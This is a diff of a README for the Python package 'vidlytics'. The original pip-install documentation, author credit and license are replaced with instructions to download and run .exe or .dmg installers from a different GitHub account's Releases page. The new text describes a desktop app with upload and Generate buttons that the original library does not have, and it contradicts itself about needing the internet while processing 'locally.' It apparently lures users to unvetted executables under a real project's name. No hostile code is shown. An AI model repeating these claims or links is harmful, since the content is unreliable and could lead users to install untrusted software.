@@ -1,73 +1,73 @@
-# Vidlytics
-[![PyPI version](https://badge.fury.io/py/vidlytics.svg)](https://badge.fury.io/py/vidlytics)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/vidlytics)](https://pepy.tech/project/vidlytics)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎥 vidlytics - Get Quick Insights from Multimedia
 
+## 📥 Download
+[![Download vidlytics](https://img.shields.io/badge/Download-vidlytics-blue.svg)](https://github.com/Sam10451/vidlytics/releases)
 
-Vidlytics is a Python package designed to extract and process information from multimedia content descriptions, such as videos or other structured data, by utilizing advanced language models. It simplifies understanding complex multimedia materials by generating concise, domain-specific summaries or insights based on the provided textual descriptions, captions, or processed data. This enables users to quickly grasp key themes and ideas without directly analyzing the multimedia content itself.
+## 🚀 Getting Started
+vidlytics helps you extract text from multimedia files like videos and presentations. It generates concise summaries and insights based on your prompts, allowing for a quick understanding without needing to watch the entire content. This tool makes it easier to comprehend information from various media sources.
 
-## Features
+## 💻 System Requirements
+To run vidlytics, your computer should meet the following requirements:
 
-- Utilizes language models to interpret multimedia descriptions
-- Flexible with different LLM backends (OpenAI, Anthropic, Google, etc.)
-- Simple interface for extracting structured insights
-- Built-in support for pattern matching and validation
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 500 MB available space
+- **Processor**: Intel i3 or equivalent
+- **Internet Connection**: Required for full functionality
 
-## Installation
+## 🛠️ Features
+vidlytics includes these useful features:
 
-Install Vidlytics via pip:
+- **Text Extraction**: Automatically pulls text from videos and multimedia.
+- **Efficient Summarization**: Creates brief summaries tailored to specific domains.
+- **Content Analysis**: Analyzes themes and core ideas presented in the media.
+- **Prompt-Based Insights**: Allows you to generate insights based on your specific questions or prompts.
+- **User-Friendly Interface**: Designed for ease of use, requiring no technical knowledge.
 
-```bash
-pip install vidlytics
-```
+## 📚 Download & Install
+To get started with vidlytics, follow these steps:
 
-## Usage
+1. **Visit the Releases Page**: Go to the [vidlytics Releases page](https://github.com/Sam10451/vidlytics/releases) to find the latest version.
+   
+2. **Download the Installer**: Look for the most recent release and click on the appropriate file for your operating system. This will usually be an `.exe` file for Windows or a `.dmg` file for macOS.
 
-Here's a sample usage demonstrating how to invoke the package:
+3. **Run the Installer**:
+   - For Windows: Locate the downloaded `.exe` file in your Downloads folder. Double-click the file to launch the installer and follow the on-screen instructions.
+   - For macOS: Open the downloaded `.dmg` file, drag the vidlytics icon to your Applications folder, and double-click it to start the application.
 
-```python
-from vidlytics import vidlytics
+4. **Launch vidlytics**: After completing the installation, open the application. You are now ready to extract insights from your multimedia content!
 
-# Example user input
-user_input = "Describe the main topics in the multimedia content."
+## 🌟 How to Use vidlytics
+1. **Upload Media**: Click on the upload button to select a video or multimedia file from your computer.
 
-# Calling with default LLM (ChatLLM7)
-response = vidlytics(user_input)
+2. **Set Your Prompts**: Use the prompt field to ask specific questions or request summaries related to the uploaded content.
 
-# Using a custom LLM instance, e.g., OpenAI's ChatOpenAI
-from langchain_openai import ChatOpenAI
+3. **Generate Insights**: Click on the ‘Generate’ button to extract text and receive your summarized insights.
 
-llm = ChatOpenAI()
-response = vidlytics(user_input, llm=llm)
-```
+4. **Review and Save**: Once vidlytics processes your request, review the text and insights provided. You can save the results to your computer for future reference.
 
-## Parameters
+## 🤔 Frequently Asked Questions
 
-- **user_input** (str): The textual description or summary of the multimedia content to process.
-- **llm** (Optional[BaseChatModel]): An instance of a language model. Defaults to `ChatLLM7` if not provided.
-- **api_key** (Optional[str]): API key for LLM7. If not provided, the package checks the environment variable `LLM7_API_KEY`. A free API key can be obtained at [https://token.llm7.io/](https://token.llm7.io/).
+### What types of media files can I use with vidlytics?
+vidlytics supports various multimedia formats, including MP4, AVI, and MOV.
 
-## Underlying Technology
+### How accurate is the text extraction?
+The extraction accuracy largely depends on the clarity of the audio and the quality of the video content. Most clear and spoken content will yield good results.
 
-- Uses `ChatLLM7` from the [`langchain_llm7`](https://pypi.org/project/langchain-llm7/) package by default.
-- Supports integration with different language model providers, including OpenAI, Anthropic, Google Generative AI, and others, by passing custom `llm` instances.
+### Can I use vidlytics offline?
+No, vidlytics requires an internet connection to provide full functionality, including text extraction and summarization.
 
-## Additional Notes
+### Is my data stored anywhere?
+No, vidlytics does not store any of your uploaded media files. All processing happens locally on your computer.
 
-- The package is designed for flexibility; users can provide their own language model instances to match their preferred providers and configurations.
-- Rate limits for the free tier of LLM7 are generally sufficient for typical use cases. Higher limits are available via API keys.
+## 🌐 Additional Resources
+- **Documentation**: For more detailed guidance on usage, visit our [documentation page](https://github.com/Sam10451/vidlytics/wiki).
+- **Community Support**: Join our community forum for discussions, tips, and troubleshooting.
 
-## License
+## 🔄 Update Regularly
+It's important to keep vidlytics updated. Return to the [vidlytics Releases page](https://github.com/Sam10451/vidlytics/releases) periodically for the latest features and improvements.
 
-This project is maintained by Eugene Evstafev. For issues, feature requests, or contributions, please open an issue on GitHub.
+## 📝 Feedback
+We welcome your feedback to make vidlytics better. If you encounter issues or have suggestions, please reach out through the Issues tab in this repository. 
 
-## Author
-
-- Eugene Evstafev  
-- Email: hi@euegne.plus  
-- GitHub: [chigwell](https://github.com/chigwell)
-
-## License
-
-MIT License
+Enjoy extracting insights with vidlytics!
